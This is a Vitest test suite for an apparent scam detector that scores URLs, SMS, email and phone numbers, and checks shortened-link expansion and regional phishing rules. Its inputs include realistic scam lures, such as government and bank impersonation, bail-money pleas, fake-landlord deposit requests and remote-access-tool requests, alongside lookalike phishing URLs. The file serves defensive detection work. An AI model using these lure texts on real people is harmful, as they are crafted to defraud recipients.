// SPDX-FileCopyrightText: 2026 Aleksandr Linde
// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, it, expect, vi } from "vitest";
import {
  checkUrl,
  checkSms,
  checkEmail,
  checkPhone,
  checkCustom,
  analyzeContent,
} from "@veriguard/detect/scamDetector";
import { expandUrl } from "@veriguard/detect/urlExpander";

// Keep isShortened from the real module so shortener-detection tests stay valid.
// Replace expandUrl with a controllable spy that returns null by default so
// existing tests are unaffected by network I/O.
vi.mock("@veriguard/detect/urlExpander", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@veriguard/detect/urlExpander")>();
  return { ...actual, expandUrl: vi.fn().mockResolvedValue({ expandedUrl: null, hops: [], status: "failed" }) };
});

// ── checkUrl ──────────────────────────────────────────────────────────────────

describe("checkUrl", () => {
  it("rates a verified AU government domain as safe", () => {
    const result = checkUrl("https://ato.gov.au");
    expect(result.verdict).toBe("safe");
    expect(result.score).toBeLessThan(20);
  });

  it("rates a subdomain of a verified AU gov domain as safe", () => {
    const result = checkUrl("https://www.servicesaustralia.gov.au/medicare");
    expect(result.verdict).toBe("safe");
  });

  it("penalises a known URL shortener", () => {
    const result = checkUrl("https://bit.ly/abc123");
    expect(result.score).toBeGreaterThanOrEqual(40);
    expect(result.flags.some((f) => f.includes("shortener"))).toBe(true);
  });

  it("penalises a suspicious TLD", () => {
    const result = checkUrl("https://login-portal.tk/verify");
    expect(result.score).toBeGreaterThan(20);
    expect(result.flags.some((f) => f.includes(".tk"))).toBe(true);
  });

  it("penalises an IP address used as hostname", () => {
    const result = checkUrl("http://1.2.3.4/phish");
    expect(result.score).toBeGreaterThanOrEqual(35);
    expect(result.flags.some((f) => f.includes("IP address"))).toBe(true);
  });

  it("penalises typosquatting of AU brands", () => {
    const result = checkUrl("https://commbank-secure.net/login");
    expect(result.score).toBeGreaterThanOrEqual(45);
    expect(result.flags.some((f) => f.includes("commbank"))).toBe(true);
  });

  it("penalises excessive hyphens (3+)", () => {
    const result = checkUrl("https://my-secure-bank-login.com");
    expect(result.flags.some((f) => f.includes("hyphens"))).toBe(true);
  });

  it("penalises HTTP (no HTTPS)", () => {
    const result = checkUrl("http://example.com");
    expect(result.flags.some((f) => f.includes("HTTPS"))).toBe(true);
  });

  it("penalises a very long URL (> 200 chars)", () => {
    const long = "https://example.com/" + "a".repeat(200);
    const result = checkUrl(long);
    expect(result.flags.some((f) => f.includes("long URL"))).toBe(true);
  });

  it("penalises too many subdomain levels (> 5 parts)", () => {
    const result = checkUrl("https://a.b.c.d.e.f.evil.com");
    expect(result.flags.some((f) => f.includes("subdomain"))).toBe(true);
  });

  it("penalises login/verify/secure keywords", () => {
    const result = checkUrl("https://example.com/verify-account");
    expect(result.flags.some((f) => f.includes("login/verify"))).toBe(true);
  });

  it("caps score at 100", () => {
    const result = checkUrl("http://1.2.3.4/mybank-secure-login-verify.tk");
    expect(result.score).toBeLessThanOrEqual(100);
  });

  it("returns suspicious verdict (score 60) for an unparseable URL", () => {
    const result = checkUrl("not-a-valid-url %%");
    expect(result.verdict).toBe("suspicious");
    expect(result.score).toBe(60);
  });

  it("prepends https when no protocol is given", () => {
    const result = checkUrl("ato.gov.au");
    expect(result.verdict).toBe("safe");
  });

  it("returns category 'URL'", () => {
    const result = checkUrl("https://example.com");
    expect(result.category).toBe("URL");
  });

  // Free-tier cloud dev platforms abused as phishing hosting (#63)
  it("flags Cloudflare Workers/Pages hosting (+35)", () => {
    const result = checkUrl("https://ato-verify-abc123.workers.dev");
    expect(result.score).toBeGreaterThanOrEqual(35);
    expect(result.flags.some((f) => f.includes("workers.dev"))).toBe(true);
  });

  it("flags a trycloudflare.com tunnel", () => {
    const result = checkUrl("https://willing-bones-random.trycloudflare.com/login");
    expect(result.flags.some((f) => f.includes("trycloudflare.com"))).toBe(true);
  });

  it("scores vercel.app/railway.app lower than Cloudflare hosting (+25)", () => {
    const vercel = checkUrl("https://my-preview.vercel.app");
    expect(vercel.flags.some((f) => f.includes("vercel.app"))).toBe(true);
    // pages.dev (+35) should outscore vercel.app (+25) with all else equal
    const pages = checkUrl("https://mygov-login.pages.dev");
    expect(pages.score).toBeGreaterThan(vercel.score);
  });
});

// ── checkSms ──────────────────────────────────────────────────────────────────

describe("checkSms", () => {
  it("rates a benign message as safe", () => {
    const result = checkSms("Hey mate, want to grab lunch tomorrow?");
    expect(result.verdict).toBe("safe");
    expect(result.score).toBeLessThan(20);
  });

  it("penalises urgency language", () => {
    const result = checkSms("URGENT: Your account has been suspended. Act now.");
    expect(result.score).toBeGreaterThan(20);
    expect(result.flags.some((f) => f.includes("Urgency"))).toBe(true);
  });

  it("penalises reward/prize language", () => {
    const result = checkSms("Congratulations! You have won a $1000 prize. Claim now.");
    expect(result.score).toBeGreaterThan(20);
    expect(result.flags.some((f) => f.includes("Prize"))).toBe(true);
  });

  it("penalises requests for sensitive info", () => {
    const result = checkSms("Please confirm your bank details and TFN to proceed.");
    expect(result.score).toBeGreaterThanOrEqual(30);
    expect(result.flags.some((f) => f.includes("sensitive"))).toBe(true);
  });

  it("penalises an embedded URL", () => {
    const result = checkSms("Your package is ready. Track it: https://example.com/track");
    expect(result.flags.some((f) => f.includes("Contains link"))).toBe(true);
  });

  it("adds extra penalty when the embedded URL itself looks dodgy", () => {
    const clean = checkSms("Click: https://example.com");
    const dodgy = checkSms("Click: http://bit.ly/scam");
    expect(dodgy.score).toBeGreaterThan(clean.score);
  });

  it("penalises government agency impersonation", () => {
    const result = checkSms("This is the ATO. Your return is overdue.");
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
  });

  it("penalises 'call back' requests", () => {
    const result = checkSms("Important message. Please call back now on 0411 222 333.");
    expect(result.flags.some((f) => f.includes("call"))).toBe(true);
  });

  it("penalises scam grammar patterns", () => {
    const result = checkSms("Pls kindly recieve ur account details via this link");
    expect(result.flags.some((f) => f.includes("Spelling"))).toBe(true);
  });

  it("caps score at 100", () => {
    const result = checkSms(
      "URGENT: Congratulations! Your ATO account is suspended. " +
        "Verify your TFN, bank details and medicare now. " +
        "Call back immediately. Pls click http://bit.ly/scam"
    );
    expect(result.score).toBeLessThanOrEqual(100);
  });

  it("returns category 'SMS'", () => {
    expect(checkSms("hello").category).toBe("SMS");
  });

  // AI voice-clone bail/kidnap/stranded escalation (#68)
  it("flags a bail-money escalation script", () => {
    const result = checkSms(
      "Gran it's me, I've been arrested. I need bail money and please don't call the police.",
    );
    expect(result.verdict).toBe("likely_scam");
    expect(result.flags.some((f) => f.toLowerCase().includes("bail money"))).toBe(true);
  });

  it("flags a stranded-overseas emergency transfer", () => {
    const result = checkSms("Mum I'm stuck overseas, wallet was stolen, I need an emergency transfer");
    expect(result.score).toBeGreaterThanOrEqual(20);
  });

  // NBN disconnection-threat smishing + NBN Co impersonation (#67)
  it("flags NBN Co disconnection-threat smishing", () => {
    const result = checkSms(
      "NBN Co: Your internet will be disconnected within 24 hours unless you verify your account.",
    );
    expect(result.verdict).toBe("likely_scam");
    expect(result.flags.some((f) => f.includes("well-known company"))).toBe(true);
  });

  // Food delivery platform impersonation (#66)
  it("flags food delivery platform impersonation with a non-gov wording", () => {
    const result = checkSms("UberEats: Your recent order was cancelled. Click here to claim your $14.90 refund.");
    expect(result.flags.some((f) => f.includes("well-known company"))).toBe(true);
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(false);
  });

  // ACCC / Scamwatch impersonation (#65)
  it("flags ACCC / Scamwatch impersonation as a government agency", () => {
    const result = checkSms("Scamwatch: Your account has been flagged for investigation. Do not discuss with others.");
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
  });

  // Superannuation SMSF / early-access phishing (#64)
  it("flags superannuation early-access phishing", () => {
    const result = checkSms("AustralianSuper: Secure your super before June 1. Access your super early via SMSF setup. Click here: http://au-super-verify.cyou");
    expect(result.verdict).toBe("likely_scam");
    expect(result.flags.some((f) => f.toLowerCase().includes("smsf"))).toBe(true);
  });

  // Guard: a bare brand mention without any other signal stays low (compound model)
  it("does not over-score a bare NBN mention with no other signal", () => {
    const result = checkSms("My nbn connection has been great this month.");
    expect(result.verdict).not.toBe("likely_scam");
  });
});

// ── checkEmail ────────────────────────────────────────────────────────────────

describe("checkEmail", () => {
  it("rates a clean email as safe", () => {
    const result = checkEmail("Hi Sarah, just confirming our 3pm meeting tomorrow.");
    expect(result.verdict).toBe("safe");
  });

  it("penalises a generic greeting", () => {
    const result = checkEmail("Dear Customer, please verify your account.");
    expect(result.flags.some((f) => f.includes("Generic greeting"))).toBe(true);
  });

  it("penalises attachment prompts", () => {
    const result = checkEmail(
      "Please open the attached invoice to complete your verification."
    );
    expect(result.flags.some((f) => f.includes("attachment"))).toBe(true);
  });

  it("penalises a dodgy sender TLD", () => {
    const result = checkEmail(
      "From: noreply@refund-ato.tk\nDear Customer, your tax refund is ready."
    );
    expect(result.flags.some((f) => f.includes("dodgy domain"))).toBe(true);
  });

  it("penalises impersonation when sender domain does not match the claimed org", () => {
    const result = checkEmail(
      "From: support@myg0v-helpdesk.net\nYour mygov account requires verification."
    );
    expect(result.flags.some((f) => f.includes("impersonation"))).toBe(true);
  });

  it("flags a From/Reply-To mismatch (sender spoofing)", () => {
    const result = checkEmail(
      'From: "myGov" <noreply@evil.tk>\nReply-To: scammer@other-domain.ru\nSubject: Account suspended\n\nVerify now.'
    );
    expect(result.flags.some((f) => /reply-to/i.test(f))).toBe(true);
  });

  it("flags display-name masking (brand name over a mismatched domain)", () => {
    const result = checkEmail('From: "myGov" <noreply@evil.tk>\n\nClick here.');
    expect(result.flags.some((f) => /masking|display name/i.test(f))).toBe(true);
  });

  it("scores lower than equivalent SMS (0.7 lenience modifier)", () => {
    const sms = checkSms("URGENT: Your ATO account is suspended. Verify now.");
    const email = checkEmail("URGENT: Your ATO account is suspended. Verify now.");
    expect(email.score).toBeLessThanOrEqual(sms.score);
  });

  it("returns category 'Email'", () => {
    expect(checkEmail("Hi there").category).toBe("Email");
  });
});

// ── checkPhone ────────────────────────────────────────────────────────────────

describe("checkPhone", () => {
  it("rates a normal AU mobile as safe (default warning only)", () => {
    const result = checkPhone("+61 412 345 678");
    expect(result.score).toBeLessThanOrEqual(20);
    // The one flag added when no other signals are found
    expect(result.flags.length).toBe(1);
  });

  it("penalises a 190x premium-rate number", () => {
    // Must start with 0 or 61 so the AU number branch runs
    const result = checkPhone("01900 123 456");
    expect(result.score).toBeGreaterThanOrEqual(50);
    expect(result.flags.some((f) => f.toLowerCase().includes("premium rate"))).toBe(true);
  });

  it("penalises repetitive-digit patterns (spoofed number)", () => {
    // "111111111" — 9 identical digits, fully matches /^(\d)\1{5,}$/
    const result = checkPhone("111111111");
    expect(result.flags.some((f) => f.toLowerCase().includes("repetitive"))).toBe(true);
  });

  it("penalises very short numbers (caller ID spoofing)", () => {
    const result = checkPhone("12345");
    expect(result.flags.some((f) => f.toLowerCase().includes("too short"))).toBe(true);
  });

  it("penalises an international prefix from a known scam region", () => {
    // 234 = Nigeria
    const result = checkPhone("+234 80 1234 5678");
    expect(result.flags.some((f) => f.toLowerCase().includes("nigeria"))).toBe(true);
  });

  it("strips formatting characters before analysis", () => {
    // Same number with different formatting should give consistent result
    const r1 = checkPhone("0412345678");
    const r2 = checkPhone("0412 345 678");
    const r3 = checkPhone("+61 412 345 678");
    expect(r1.score).toBe(r2.score);
    // r3 has +61 prefix (not a risky prefix), should also give same result
    expect(r3.score).toBe(r1.score);
  });

  it("caps score at 100", () => {
    const result = checkPhone("190000000000");
    expect(result.score).toBeLessThanOrEqual(100);
  });

  it("returns category 'Phone Number'", () => {
    expect(checkPhone("0412 345 678").category).toBe("Phone Number");
  });
});

// ── checkCustom ───────────────────────────────────────────────────────────────

describe("checkCustom", () => {
  it("returns score 10 and a 'no signals' flag for benign text", () => {
    const result = checkCustom("What is the weather like today?");
    expect(result.score).toBe(10);
    expect(result.flags.some((f) => f.includes("No obvious"))).toBe(true);
  });

  it("penalises urgency + reward + request keywords", () => {
    const result = checkCustom(
      "Urgent: You have won a free gift card. Provide your bank details now."
    );
    expect(result.score).toBeGreaterThan(30);
    expect(result.flags.some((f) => f.includes("Suspicious keywords"))).toBe(true);
  });

  it("penalises embedded URLs and scores the worst one", () => {
    const result = checkCustom(
      "Check this out: http://bit.ly/scam — looks legit right?"
    );
    expect(result.flags.some((f) => f.includes("link"))).toBe(true);
    expect(result.score).toBeGreaterThan(10);
  });

  it("caps score at 100", () => {
    const text = Array(20)
      .fill("urgent winner bank details bitcoin gift card tfn medicare")
      .join(" ");
    expect(checkCustom(text).score).toBeLessThanOrEqual(100);
  });

  it("returns category 'Custom'", () => {
    expect(checkCustom("test").category).toBe("Custom");
  });
});

// ── verdict thresholds (via scoreToResult indirectly) ─────────────────────────

describe("verdict thresholds", () => {
  it("score < 20 → safe", () => {
    expect(checkUrl("https://ato.gov.au").verdict).toBe("safe");
  });

  it("score 20–44 → suspicious", () => {
    // A URL with only HTTP (score ~15) should still be suspicious if combined
    // Use a shortener which alone gives score 40 → suspicious
    const result = checkUrl("https://bit.ly/safe");
    expect(result.verdict).toBe("suspicious");
  });

  it("score 45–69 → likely_scam", () => {
    // typosquatting alone adds 45 points
    const result = checkUrl("https://commbank-phish.net");
    expect(result.verdict).toBe("likely_scam");
  });

  it("score ≥ 70 → likely_scam, with details naming the reporting body", () => {
    const result = checkUrl("http://commbank-secure-login.tk/verify");
    expect(result.verdict).toBe("likely_scam");
    expect(result.details).toMatch(/almost certainly a scam/);
    // The top band is the one that tells the user where to report.
    expect(result.details).toMatch(/Scamwatch/);
  });
});

// ── analyzeContent (per-identifier orchestration) ─────────────────────────────

describe("analyzeContent", () => {
  it("returns an empty array for blank input", async () => {
    expect(await analyzeContent("   ")).toEqual([]);
  });

  it("returns a single url card for a bare URL", async () => {
    const cards = await analyzeContent("https://bit.ly/scam");
    expect(cards).toHaveLength(1);
    expect(cards[0].kind).toBe("url");
  });

  it("produces separate cards for the sender and an embedded link in an email", async () => {
    const cards = await analyzeContent(
      'From: "myGov" <noreply@evil.tk>\nReply-To: scam@other.ru\n\nVerify at https://fake-ato.xyz/login now',
    );
    const kinds = cards.map((c) => c.kind);
    expect(kinds).toContain("email");
    expect(kinds).toContain("url");
  });

  it("de-duplicates repeated URLs", async () => {
    const cards = await analyzeContent("see https://bit.ly/x and again https://bit.ly/x");
    const urlCards = cards.filter((c) => c.kind === "url" && c.value === "https://bit.ly/x");
    expect(urlCards).toHaveLength(1);
  });

  it("sorts cards by risk score, highest first", async () => {
    const cards = await analyzeContent(
      "Hi, click https://commbank-secure-login.tk/verify and also https://ato.gov.au",
    );
    for (let i = 1; i < cards.length; i++) {
      expect(cards[i - 1].result.score).toBeGreaterThanOrEqual(cards[i].result.score);
    }
  });

  it("always returns at least one card for non-empty input", async () => {
    expect((await analyzeContent("just some harmless words")).length).toBeGreaterThanOrEqual(1);
  });

  it("caps the number of cards", async () => {
    const many = "https://a.tk https://b.tk https://c.tk https://d.tk https://e.tk https://f.tk";
    expect((await analyzeContent(many)).length).toBeLessThanOrEqual(5);
  });

  it("returns a phone card when the whole input is a number", async () => {
    const cards = await analyzeContent("+61 412 345 678");
    expect(cards[0].kind).toBe("phone");
  });
});

// ── analyzeContent — shortened URL expansion ──────────────────────────────────

describe("analyzeContent — shortened URL expansion", () => {
  it("expands a shortener and includes the real destination in the result", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "https://commbank-phishing.tk/steal",
      hops: ["https://commbank-phishing.tk/steal"],
      status: "expanded",
    });

    const cards = await analyzeContent("https://bit.ly/scam-exp");
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.expandedUrl).toBeTruthy();
    expect(urlCard?.result.flags.some((f) => f.includes("expanded"))).toBe(true);
  });

  it("raises the score to at least the destination score when destination is riskier than the short URL alone", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "http://1.2.3.4/phish",
      hops: ["http://1.2.3.4/phish"],
      status: "expanded",
    });

    const cards = await analyzeContent("https://bit.ly/scam-score");
    const urlCard = cards.find((c) => c.kind === "url");
    // IP-address destination adds ≥35; combined with shortener (40) → ≥40
    expect(urlCard?.result.score).toBeGreaterThanOrEqual(40);
  });

  it("raises the score to at least the shortener score when the destination is safer", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "https://example.com/landing",
      hops: ["https://example.com/landing"],
      status: "expanded",
    });

    // bit.ly alone scores 40; example.com scores ~0; merged must stay ≥ 40
    const cards = await analyzeContent("https://bit.ly/scam-min-score");
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.score).toBeGreaterThanOrEqual(40);
  });

  it("adds a multi-hop flag when the chain has more than one redirect", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "https://evil-final.tk/phish",
      hops: ["https://tinyurl.com/hop2", "https://evil-final.tk/phish"],
      status: "expanded",
    });

    const cards = await analyzeContent("https://bit.ly/multi-hop");
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.flags.some((f) => f.includes("Multi-hop"))).toBe(true);
  });

  it("does NOT add a multi-hop flag for a single-hop expansion", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "https://evil.tk/phish",
      hops: ["https://evil.tk/phish"],
      status: "expanded",
    });

    const cards = await analyzeContent("https://bit.ly/single-hop");
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.flags.some((f) => f.includes("Multi-hop"))).toBe(false);
  });

  it("falls back gracefully to the shortener result when expansion returns null", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({ expandedUrl: null, hops: [], status: "failed" });

    const cards = await analyzeContent("https://bit.ly/unexpandable");
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.flags.some((f) => f.includes("shortener"))).toBe(true);
    expect(urlCard?.result.expandedUrl).toBeUndefined();
  });

  it("defangs the expanded URL stored in expandedUrl so it is never a live link", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "https://phishing-site.tk/steal",
      hops: ["https://phishing-site.tk/steal"],
      status: "expanded",
    });

    const cards = await analyzeContent("https://bit.ly/defang-check");
    const urlCard = cards.find((c) => c.kind === "url");
    // A defanged URL contains [.] instead of dots and hxxps instead of https
    expect(urlCard?.result.expandedUrl).toContain("[.]");
    expect(urlCard?.result.expandedUrl).not.toMatch(/^https?:\/\//);
  });

  it("expands shortened URLs embedded inside an SMS message", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "https://commbank-phishing.tk/login",
      hops: ["https://commbank-phishing.tk/login"],
      status: "expanded",
    });

    const cards = await analyzeContent(
      "Your package is ready. Track: https://bit.ly/sms-embed-exp",
    );
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.expandedUrl).toBeTruthy();
    expect(urlCard?.result.flags.some((f) => f.includes("expanded"))).toBe(true);
  });
});

// ── 2026-06-21 threat-intel roadmap rules ───────────────────────────────────

describe("threat-intel roadmap — URL rules", () => {
  it("flags IPFS gateway hosts (D9 / #56)", () => {
    const result = checkUrl("https://cloudflare-ipfs.com/ipfs/QmXoYPVK8v3BhKmXNqr2Xf5jK9WbV2TzLpRqt6cCdYz3A/");
    expect(result.flags.some((f) => f.includes("IPFS"))).toBe(true);
    expect(result.score).toBeGreaterThanOrEqual(40);
  });

  it("flags the /ipfs/<CID> path on any host (D9 / #56)", () => {
    const result = checkUrl("https://random-host.example/ipfs/bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi");
    expect(result.flags.some((f) => f.includes("IPFS"))).toBe(true);
  });

  it("flags newly-abused TLDs like .cyou and .icu (D4 / #50, #58)", () => {
    for (const host of ["https://claim-points.cyou", "https://toll-pay.icu"]) {
      const result = checkUrl(host);
      expect(result.flags.some((f) => f.includes("top-level domain"))).toBe(true);
    }
  });

  it("flags a trusted host carrying a nested redirect URL (D16)", () => {
    const result = checkUrl("https://example.com/click?url=https://evil.example/login");
    expect(result.flags.some((f) => f.includes("redirect"))).toBe(true);
  });

  // The host test is an exact match or a dot-prefixed suffix, not a bare
  // "ends with". A plain suffix test also accepts "notlinkedin.com", which is
  // a lookalike a scammer registers rather than the trusted service this rule
  // is about — so the redirect reason must not be the one attached to it.
  it("reads the LinkedIn redirect path on the real host and its subdomains (D16)", () => {
    for (const host of ["linkedin.com", "www.linkedin.com"]) {
      const result = checkUrl(`https://${host}/slink?code=abc`);
      expect(result.flags.some((f) => f.includes("redirect"))).toBe(true);
    }
  });

  it("does not read a LinkedIn lookalike host as the trusted service (D16)", () => {
    for (const host of ["notlinkedin.com", "evil-linkedin.com"]) {
      const result = checkUrl(`https://${host}/slink?code=abc`);
      expect(result.flags.some((f) => f.includes("Trusted service"))).toBe(false);
    }
  });
});

describe("threat-intel roadmap — SMS rules", () => {
  it("detects the 'Reply Y to activate' bypass (D3 / #54)", () => {
    const result = checkSms("Reply Y to activate your link and claim your Qantas points");
    expect(result.flags.some((f) => f.includes("Reply Y"))).toBe(true);
  });

  // The quote around the Y is optional and used to sit between two separate
  // space runs; it now carries its own trailing space. The quoted forms are the
  // ones a narrower rewrite drops, so they are pinned here alongside the bare
  // ones rather than left to the single case above.
  it.each([
    "Reply Y to activate your link",
    "Reply 'Y' to access your parcel",
    'Reply "Yes" to activate your account',
    "Reply yes to proceed to the link",
    "Reply  Y  to activate",
    "Reply 'Yes' to view your delivery",
    "ReplyY to access the link",
  ])("reads %j as the reply-to-activate bypass (D3 / #54)", (text) => {
    expect(checkSms(text).flags.some((f) => f.includes("Reply Y"))).toBe(true);
  });

  it("detects the 'copy link into your browser' variant (D3 / #54)", () => {
    const result = checkSms("Copy this link into your browser to pay your toll: example.com");
    expect(result.flags.some((f) => f.includes("Reply Y"))).toBe(true);
  });

  it("detects toll-road urgency language (D2 / #53)", () => {
    const result = checkSms("Linkt: you have an unpaid toll of $12.40. Pay now to avoid a fine.");
    expect(result.flags.some((f) => f.includes("Urgency"))).toBe(true);
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
  });

  it("detects QR quishing prompts (D11)", () => {
    const result = checkSms("Scan the QR code to verify your myGov account");
    expect(result.flags.some((f) => f.includes("QR code"))).toBe(true);
  });

  it("flags fake-job recruitment only with 2+ signals (D13 / #51)", () => {
    const hit = checkSms("Earn $500/day with simple tasks, work from home, no experience required");
    expect(hit.flags.some((f) => f.includes("recruitment"))).toBe(true);
    // A single signal should NOT trip the composite.
    const miss = checkSms("We have a flexible work from home opportunity at our Sydney office.");
    expect(miss.flags.some((f) => f.includes("recruitment"))).toBe(false);
  });

  it("detects loyalty points-expiry phishing language (D6 / #57)", () => {
    const result = checkSms("Flybuys: your 4,300 loyalty points will expire in 3 days. Claim them now: example.com");
    expect(result.flags.some((f) => f.includes("reward language"))).toBe(true);
  });

  it("detects remote-access-tool scam requests (D8 / #55)", () => {
    const result = checkSms("This is the ACSC. Download AnyDesk so we can fix the malware on your device.");
    expect(result.flags.some((f) => f.includes("sensitive info"))).toBe(true);
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
  });

  it("detects the bank 'safe account' tag-team scam (#47)", () => {
    const result = checkSms("This is CommBank security. Move your funds to a safe account immediately to protect your money.");
    expect(result.flags.some((f) => f.includes("sensitive info"))).toBe(true);
  });

  it("detects recovery-fraud bait language (D2 / #179)", () => {
    const result = checkSms("Hi, I'm a fund recovery specialist and I can recover your lost funds for a small upfront fee.");
    expect(result.flags.some((f) => f.includes("reward language"))).toBe(true);
  });

  it("does not flag a lone recovery-fraud phrase as more than suspicious (D2 / #179)", () => {
    const result = checkSms("This advisory explains how to recover your lost funds if you have been scammed.");
    expect(result.verdict).not.toBe("likely_scam");
  });

  it("detects the fabricated IRS 'Tax Resolution Oversight Department' (D4 / #181)", () => {
    const result = checkSms(
      "Notice from the Tax Resolution Oversight Department: your preparer account has been flagged.",
      undefined,
      "US",
    );
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
  });

  // The roadmap proposed a bare "tax resolution oversight" entry alongside the
  // full name. It was left out: the prefix is ordinary tax-industry English, and
  // matching it would flag legitimate mail from the tax professionals this
  // campaign targets. Only the fabricated department name is scored.
  it("does not flag legitimate 'tax resolution oversight' prose (D4 / #181)", () => {
    const result = checkSms(
      "Our tax resolution oversight process ensures your return is reviewed.",
      undefined,
      "US",
    );
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(false);
  });

  it("scopes the fabricated IRS unit name to the US pack (D4 / #181)", () => {
    const result = checkSms(
      "Notice from the Tax Resolution Oversight Department: your preparer account has been flagged.",
      undefined,
      "AU",
    );
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(false);
  });

  // The unit name is fabricated, but on its own it only earns the standard +25
  // authority-mention score. It takes a second signal — a link, a payment demand
  // — to tip the verdict, so this asserts the flag rather than a scam verdict.
  it("does not tip the verdict on the fabricated unit name alone (D4 / #181)", () => {
    const result = checkSms("Tax Resolution Oversight Department", undefined, "US");
    expect(result.verdict).not.toBe("likely_scam");
  });

  it("detects the generic DWP benefit-entitlement lure (D1 / #178)", () => {
    const result = checkSms("Benefit entitlement check required. Confirm your details.", undefined, "GB");
    expect(result.flags.some((f) => f.includes("Urgency language"))).toBe(true);
  });

  it("escalates the benefit lure when it carries an authority mention and a link (D1 / #178)", () => {
    const result = checkSms(
      "DWP: benefit entitlement check required. Confirm your details at https://dwp-check.cyou/x",
      undefined,
      "GB",
    );
    expect(result.verdict).toBe("likely_scam");
  });

  it("scopes the benefit-entitlement phrases to the GB pack (D1 / #178)", () => {
    const result = checkSms("Benefit entitlement check required.", undefined, "AU");
    expect(result.flags.some((f) => f.includes("Urgency language"))).toBe(false);
  });

  // Welfare-rights charities do text this phrasing, so the bare "entitled to a
  // benefit" form the roadmap proposed is deliberately not in the list. This
  // pins the near-miss the issue called out as the false-positive risk.
  it("does not flag legitimate welfare-rights phrasing (D1 / #178)", () => {
    const result = checkSms(
      "You may be entitled to a benefit called Attendance Allowance. Ask us how to claim.",
      undefined,
      "GB",
    );
    expect(result.flags.some((f) => f.includes("Urgency language"))).toBe(false);
  });

  // A lone entitlement phrase scores +10 — below every verdict threshold. It
  // takes a second signal to escalate, which is the behaviour the issue asked
  // to confirm.
  it("does not tip the verdict on a benefit phrase alone (D1 / #178)", () => {
    const result = checkSms("Benefit entitlement check required.", undefined, "GB");
    expect(result.verdict).not.toBe("likely_scam");
  });

  const FAKE_LANDLORD =
    "The landlord is abroad so we cannot do a viewing. Pay the holding deposit to secure the room; " +
    "bank details below. Keys will be sent by post.";

  it("detects the fake-landlord deposit script (D3 / #180)", () => {
    const result = checkSms(FAKE_LANDLORD, undefined, "GB");
    expect(result.verdict).toBe("likely_scam");
  });

  it("fires the fake-landlord phrases in every region (base signal) (D3 / #180)", () => {
    for (const region of ["AU", "GB", "NZ", "IE", "US", "CA"]) {
      const result = checkSms("The landlord is abroad, so transfer deposit to hold the room.", undefined, region);
      expect(result.flags.some((f) => f.includes("sensitive info"))).toBe(true);
    }
  });

  it("does not tip the verdict on an absent-landlord phrase alone (D3 / #180)", () => {
    const result = checkSms("The landlord is abroad at the moment.", undefined, "GB");
    expect(result.verdict).not.toBe("likely_scam");
  });

  // The medium-confidence "keys by post" phrases are gated on a deposit or bank
  // ask rather than listed flat in REQUEST_WORDS — the issue left this decision
  // to implementation. Ungated, this ordinary move-in message would score.
  it("does not flag keys-by-post without a deposit ask (D3 / #180)", () => {
    const result = checkSms(
      "Your new keys will be posted to you once the lease agreement is signed.",
      undefined,
      "GB",
    );
    expect(result.verdict).toBe("safe");
    expect(result.flags).toHaveLength(0);
  });

  it("flags keys-by-post when it accompanies a deposit ask (D3 / #180)", () => {
    const result = checkSms(
      "Send the deposit today and the keys will be posted to you.",
      undefined,
      "GB",
    );
    expect(result.flags.some((f) => f.includes("Keys promised by post"))).toBe(true);
  });

  // The issue asked to confirm the new phrases don't stack with the existing
  // rental-bond composite into an unintentionally high score. They don't: real
  // letting messages stay clean at zero.
  it("leaves legitimate property-management messages clean (D3 / #180)", () => {
    for (const text of [
      "Your property manager has scheduled the annual inspection for Tuesday.",
      "We have received your holding deposit and lodged it with the tenancy deposit scheme.",
    ]) {
      const result = checkSms(text, undefined, "GB");
      expect(result.verdict).toBe("safe");
    }
  });
});

describe("threat-intel roadmap — phone rules (D15 / #49)", () => {
  it("flags elevated-volume origins (India) without overstating risk", () => {
    const result = checkPhone("+91 98765 43210");
    // Surfaced as a caution, with explicit acknowledgement of legit callers,
    // and capped at a moderate score — never the very_high reserved for fakes.
    expect(result.flags.some((f) => /India/.test(f))).toBe(true);
    expect(result.flags.some((f) => /perfectly legitimate/.test(f))).toBe(true);
    expect(result.phoneIntel?.spoofingRisk).toBe("medium");
  });

  it("still rates a known high-scam origin (Nigeria) as high, not medium", () => {
    const result = checkPhone("+234 800 123 4567");
    expect(result.phoneIntel?.spoofingRisk).toBe("high");
  });
});

describe("threat-intel roadmap 2026-07-05 (#73-#78)", () => {
  it("detects tax-time cost-of-living lure language (D1 / #73)", () => {
    const result = checkSms("A $750 cost of living payment is waiting for you.");
    expect(result.flags.some((f) => f.includes("cost of living payment"))).toBe(true);
  });

  it("treats myID as a government-agency mention (D2 / #73)", () => {
    const result = checkSms("myID: verify your digital identity to keep your account active.");
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
  });

  it("warns that gov bodies don't put links in unsolicited SMS (D1 / #73)", () => {
    const result = checkSms("myGov: your tax has been recalculated. Confirm here: https://mygov-refund.xyz");
    expect(result.flags.some((f) => f.includes("removed links from their unsolicited SMS"))).toBe(true);
  });

